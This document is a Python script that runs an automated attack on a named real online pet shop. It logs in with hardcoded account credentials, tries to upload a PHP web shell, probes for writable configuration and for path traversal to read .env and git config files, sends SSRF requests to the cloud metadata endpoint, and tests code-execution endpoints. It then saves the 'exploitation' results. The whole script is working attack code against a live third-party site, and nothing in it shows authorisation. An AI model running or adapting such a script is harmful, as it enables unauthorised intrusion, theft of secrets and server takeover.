#!/usr/bin/env python3
"""Full Exploitation with Proper Login"""
import requests
import re
import json
import base64
import urllib.parse
from urllib.parse import urljoin
from datetime import datetime
import urllib3
urllib3.disable_warnings()

# Credentials
ACCOUNT = {
    "email": "suobup@dunkos.xyz",
    "password": "suobup@dunkos.xyzQ1"
}

AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"
target = "www.zooplus.de"
base = f"https://{target}"
results = []
s = requests.Session()
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

print("=" * 70)
print("FULL EXPLOITATION WITH AUTHENTICATION")
print("=" * 70)

# LOGIN
print("\n[STEP 1] LOGIN...")
print("-" * 70)

try:
    params = {
        "response_type": "code",
        "client_id": "shop-myzooplus-prod-zooplus",
        "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login",
        "state": "pentest-state",
        "login": "true",
        "ui_locales": "de-DE",
        "scope": "openid",
    }
    r1 = s.get(AUTH_URL, params=params, headers=UA, verify=False)
    r1.raise_for_status()
    
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if not m:
        raise RuntimeError("Login form action not found")
    action = m.group(1).replace("&amp;", "&")
    if not action.startswith("http"):
        action = urllib.parse.urljoin(r1.url, action)
    
    data = {
        "username": ACCOUNT["email"],
        "password": ACCOUNT["password"],
        "credentialId": "",
    }
    r2 = s.post(action, data=data, headers=UA, allow_redirects=False, verify=False)
    if r2.status_code not in (302, 303):
        raise RuntimeError(f"Unexpected login POST response: {r2.status_code}")
    
    loc = r2.headers.get("Location", "")
    s.get(loc, headers=UA, allow_redirects=True, verify=False)
    s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", headers=UA, allow_redirects=True, verify=False)
    s.get("https://www.zooplus.de/account/overview", headers=UA, allow_redirects=True, verify=False)
    
    cookies = s.cookies.get_dict()
    print(f"  [SUCCESS] Logged in as {ACCOUNT['email']}")
    print(f"      Cookies: {list(cookies.keys())}")
    
    # Get CSRF token
    csrf = s.cookies.get("csrfToken")
    if csrf:
        s.headers.update({"x-csrf-token": csrf})
        print(f"      CSRF Token: {csrf[:30]}...")
    
except Exception as e:
    print(f"  [ERROR] Login failed: {e}")
    exit(1)

# EXPLOIT FILE UPLOAD
print("\n[STEP 2] FILE UPLOAD...")
print("-" * 70)

php_shell = "<?php system($_GET['cmd']); ?>"
for endpoint in ["/api/upload", "/api/file/upload", "/upload"]:
    url = urljoin(base, endpoint)
    try:
        files = {'file': ('shell.php', php_shell, 'application/x-php')}
        resp = s.post(url, files=files, timeout=5, verify=False, allow_redirects=False)
        if resp.status_code in [200, 201, 302]:
            results.append({"v": "file_upload", "s": "CRITICAL", "ep": endpoint, "st": resp.status_code})
            print(f"  [CRITICAL] Upload success: {endpoint}")
            if resp.headers.get('Location'):
                print(f"      Location: {resp.headers.get('Location')}")
    except: pass

# EXPLOIT CONFIG
print("\n[STEP 3] CONFIG INJECTION...")
print("-" * 70)

config_url = urljoin(base, "/api/config")
try:
    resp = s.get(config_url, timeout=5, verify=False, allow_redirects=False)
    if resp.status_code == 200:
        results.append({"v": "config_read", "s": "HIGH", "c": resp.text[:500]})
        print(f"  [HIGH] Config readable!")
        print(f"      Preview: {resp.text[:200]}")
except: pass

try:
    resp = s.post(config_url, json={"debug": True}, timeout=5, verify=False, allow_redirects=False)
    if resp.status_code in [200, 201, 204]:
        results.append({"v": "config_write", "s": "CRITICAL"})
        print(f"  [CRITICAL] Config writable!")
except: pass

# EXPLOIT PATH TRAVERSAL
print("\n[STEP 4] PATH TRAVERSAL...")
print("-" * 70)

for f in ["/.env", "/config.json", "/.git/config"]:
    for p in [f"/stats/../{f.lstrip('/')}", f"/stats/../../{f.lstrip('/')}"]:
        try:
            resp = s.get(urljoin(base, p), timeout=3, verify=False, allow_redirects=False)
            if resp.status_code == 200 and not resp.text.strip().startswith('<!'):
                if len(resp.text) < 50000:
                    if any(x in resp.text for x in ['NODE_ENV', 'AWS_', 'DB_', 'SECRET', 'config']):
                        results.append({"v": "path_traversal", "s": "CRITICAL", "f": f, "c": resp.text[:500]})
                        print(f"  [CRITICAL] Path traversal: {f}")
                        print(f"      Content: {resp.text[:200]}")
                        break
        except: pass

# EXPLOIT SSRF
print("\n[STEP 5] SSRF...")
print("-" * 70)

for ep in ["/api/fetch", "/api/proxy", "/api/request"]:
    url = urljoin(base, ep)
    try:
        resp = s.post(url, json={"url": "http://169.254.169.254/latest/meta-data/"}, timeout=3, verify=False, allow_redirects=False)
        if resp.status_code in [200, 400] and "metadata" in resp.text.lower():
            results.append({"v": "ssrf", "s": "CRITICAL", "ep": ep, "r": resp.text[:500]})
            print(f"  [CRITICAL] SSRF: {ep}")
            print(f"      Response: {resp.text[:300]}")
            break
    except: pass

# EXPLOIT CODE EXECUTION
print("\n[STEP 6] CODE EXECUTION...")
print("-" * 70)

for ep in ["/api/execute", "/api/eval", "/api/run"]:
    url = urljoin(base, ep)
    try:
        resp = s.post(url, json={"code": "print('test')"}, timeout=3, verify=False, allow_redirects=False)
        if resp.status_code == 200 and "test" in resp.text.lower():
            results.append({"v": "code_exec", "s": "CRITICAL", "ep": ep, "o": resp.text[:500]})
            print(f"  [CRITICAL] Code exec: {ep}")
            print(f"      Output: {resp.text[:200]}")
            break
    except: pass

# SUMMARY
print("\n" + "=" * 70)
print("SUMMARY")
print("=" * 70)
print(f"Total: {len(results)}")

if results:
    import os
    os.makedirs("reports", exist_ok=True)
    with open("reports/full_exploit.json", "w") as f:
        json.dump({"results": results}, f, indent=2)
    print(f"[+] Saved to reports/full_exploit.json")
    c = len([x for x in results if x['s'] == 'CRITICAL'])
    h = len([x for x in results if x['s'] == 'HIGH'])
    print(f"CRITICAL: {c}, HIGH: {h}")
else:
    print("No exploitations")

print("=" * 70)

